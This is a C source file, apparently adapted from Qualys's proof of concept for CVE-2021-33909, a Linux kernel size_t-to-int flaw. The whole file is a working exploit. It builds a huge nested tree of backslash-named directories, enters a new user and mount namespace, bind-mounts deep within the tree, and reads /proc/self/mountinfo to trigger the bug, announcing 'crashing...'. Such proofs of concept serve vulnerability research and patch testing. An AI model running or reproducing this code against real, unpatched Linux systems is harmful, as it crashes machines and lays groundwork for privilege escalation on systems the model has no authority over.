/*
 * CVE-2021-33909: size_t-to-int vulnerability in Linux's filesystem layer
 * Copyright (C) 2021 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <sched.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>

#include <localUtil.h>

typedef struct
{
    pid_t pid;
    int socks[2];
    size_t count;
    int delete;
} t_userns;

static const char *bigdir;
static char onedir[NAME_MAX + 1];

static int
send_recv_state(const int sock, const char *const sstate, const char rstate)
{
    int result = -1;
    char state = 0;

    if (sstate)
    {
        SAFE_ERR(send(sock, sstate, 1, MSG_NOSIGNAL) != 1);
    }
    if (rstate)
    {
        SAFE_ERR(read(sock, &state, 1) != 1);
        SAFE_ERR(state != rstate);
    }

    result = 0;
fail:
    return result;
}

static int
userns_fn(void *const arg)
{
    int result = -1;
    const t_userns *const userns = arg;
    int sock = 0;
    size_t len = 0;
    size_t n;
    char device[] = "./device.XXXXXX";
    char mpoint[] = "/tmp/mpoint.XXXXXX";
    int fd = -1;
    static char buf[1UL << 20];
    ssize_t nbr = 0;
    const char *nl = 0;

    SAFE_ERR(!arg);
    sock = userns->socks[1];
    SAFE_ERR(close(userns->socks[0]));
    SAFE_ERR(send_recv_state(sock, NULL, 'A') == -1);

    SAFE_ERR(chdir(bigdir));

    for (n = 0; n <= userns->count / (1 + (sizeof(onedir) - 1) * 4); n++)
    {
        SAFE_ERR(chdir(onedir));
    }
    SAFE_ERR(!mkdtemp(device));
    SAFE_ERR(!mkdtemp(mpoint));
    SAFE_ERR(mount(device, mpoint, NULL, MS_BIND, NULL));

    if (userns->delete)
    {
        SAFE_ERR(rmdir(device));
    }
    SAFE_ERR(chdir("/"));

    SAFE_ERR(send_recv_state(sock, "B", 'C') == -1);

    fd = open("/proc/self/mountinfo", O_RDONLY);
    SAFE_ERR(fd <= -1);
    for (;;)
    {
        nbr = read(fd, buf, 1024);
        SAFE_ERR(nbr <= 0);
        for (;;)
        {
            nl = memchr(buf, '\n', nbr);
            SAFE_BREAK(!nl);
            nl++;
            SAFE_ERR(memmem(buf, nl - buf, "\\134", 4));
            nbr -= nl - buf;
            memmove(buf, nl, nbr);
            len = 0;
        }
        len += nbr;
        SAFE_BREAK(memmem(buf, nbr, "\\134", 4));
    }

    SAFE_ERR(send_recv_state(sock, "D", 'E') == -1);
    result = 0;
fail:
    return result;
}

static int
update_id_map(char *const mapping, const char *const map_file)
{
    int result = -1;
    const size_t map_len = strlen(mapping);
    size_t i = 0;
    int fd = -1;

    SAFE_ERR(map_len >= SSIZE_MAX);
    SAFE_ERR(map_len <= 0);

    for (i = 0; i < map_len; i++)
    {
        if (mapping[i] == ',')
        {
            mapping[i] = '\n';
        }
    }

    fd = open(map_file, O_WRONLY);
    SAFE_ERR(fd <= -1);
    SAFE_ERR(write(fd, mapping, map_len) != (ssize_t)map_len);
    
    result = 0;
fail:
    SAFE_CLOSE(fd);
    return result;
}

static int
proc_setgroups_write(const pid_t child_pid, const char *const str)
{
    int result = -1;
    const size_t str_len = strlen(str);
    char setgroups_path[64];
    int fd = -1;
    
    SAFE_ERR(str_len >= SSIZE_MAX);
    SAFE_ERR(str_len <= 0);

    snprintf(setgroups_path, sizeof(setgroups_path), "/proc/%ld/setgroups", (long)child_pid);

    fd = open(setgroups_path, O_WRONLY);
    if (fd <= -1)
    {
        SAFE_ERR(fd != -1);
        SAFE_ERR(errno != ENOENT);
        goto finish;
    }
    SAFE_ERR(write(fd, str, str_len) != (ssize_t)str_len);

finish:
    result = 0;
fail:
    SAFE_CLOSE(fd);
    return result;
}

static int
fork_userns(t_userns *const userns, const size_t size, const int delete)
{
    int result = -1;
    static const size_t stack_size = (1UL << 20) + 2 * PAGE_SIZE;
    static char *stack = NULL;
    char map_path[64], map_buf[64];

    if (!stack)
    {
        stack = mmap(NULL, stack_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        SAFE_ERR(!stack || stack == MAP_FAILED);
        SAFE_ERR(mprotect(stack + PAGE_SIZE, stack_size - 2 * PAGE_SIZE, PROT_READ | PROT_WRITE))
    }

    SAFE_ERR(!userns);
    userns->count = size / 2;
    userns->delete = delete;

    SAFE_ERR(socketpair(AF_UNIX, SOCK_STREAM, 0, userns->socks));
    userns->pid = clone(userns_fn, stack + stack_size - PAGE_SIZE, CLONE_NEWUSER | CLONE_NEWNS | SIGCHLD, userns);
    SAFE_ERR(userns->pid <= -1);
    SAFE_ERR(close(userns->socks[1]));
    userns->socks[1] = -1;

    snprintf(map_path, sizeof(map_path), "/proc/%ld/uid_map", (long)userns->pid);
    snprintf(map_buf, sizeof(map_buf), "0 %ld 1", (long)getuid());
    SAFE_ERR(update_id_map(map_buf, map_path) == -1);

    SAFE_ERR(proc_setgroups_write(userns->pid, "deny") == -1);
    snprintf(map_path, sizeof(map_path), "/proc/%ld/gid_map", (long)userns->pid);
    snprintf(map_buf, sizeof(map_buf), "0 %ld 1", (long)getgid());
    SAFE_ERR(update_id_map(map_buf, map_path) == -1);

    SAFE_ERR(send_recv_state(*userns->socks, "A", 'B') == -1);
    result = 0;
fail:
    return result;
}

static int
wait_userns(t_userns *const userns)
{
    int result = -1;
    int status = 0;

    SAFE_ERR(!userns);
    SAFE_ERR(kill(userns->pid, SIGKILL));

    SAFE_ERR(waitpid(userns->pid, &status, 0) != userns->pid);
    userns->pid = -1;
    SAFE_ERR(!WIFSIGNALED(status));
    SAFE_ERR(WTERMSIG(status) != SIGKILL);

    SAFE_CLOSE(*userns->socks);
    result = 0;
fail:
    return result;
}

int main(const int argc, const char *const argv[])
{
    int result = -1;
    size_t i;
    static t_userns userns;

    SAFE_PAIL(argc != 2, "need one argument, directory absolute path");
    bigdir = argv[1];
    SAFE_PAIL(*bigdir != '/', "path not absolute");

    SAFE_ERR(sizeof(onedir) != 256);
    memset(onedir, '\\', sizeof(onedir) - 1);
    SAFE_ERR(onedir[sizeof(onedir) - 1] != '\0');

    puts("creating directories, please wait...");
    SAFE_ERR(mkdir(bigdir, S_IRWXU) && errno != EEXIST);
    SAFE_ERR(chdir(bigdir))
    for (i = 0; i <= (1UL << 30) / (1 + (sizeof(onedir) - 1) * 4); i++)
    {
        SAFE_ERR(mkdir(onedir, S_IRWXU) && errno != EEXIST);
        SAFE_ERR(chdir(onedir));
    }
    SAFE_ERR(chdir("/"));

    SAFE_ERR(fork_userns(&userns, (1UL << 31), 1) == -1);
    puts("crashing...");
    SAFE_ERR(send_recv_state(*userns.socks, "C", 'D') == -1);
    SAFE_ERR(wait_userns(&userns) == -1);

    result = 0;
fail:
    return result;
}
